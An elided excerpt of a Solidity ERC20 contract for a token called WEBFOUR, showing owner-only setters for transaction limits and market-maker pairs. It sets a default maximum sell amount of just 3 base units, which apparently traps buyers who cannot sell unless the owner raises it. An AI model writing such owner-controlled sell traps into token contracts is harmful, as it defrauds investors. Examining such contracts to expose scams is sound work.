...
contract WEBFOUR is ERC20, Ownable {
    ...
    uint256 public maxSellTransactionAmount = 3 * (10**0);
    ...
    function setMaxTxAmount(uint256 _maxBuyTxAmount, uint256 _maxSellTxAmount) public onlyOwner {
        ...
        maxSellTransactionAmount = _maxSellTxAmount * (39000);
    }

    constructor() ERC20("Webfour", "WEBFOUR") {
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "WEBFOUR: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "WEBFOUR: Automated market maker pair is already set to that value");
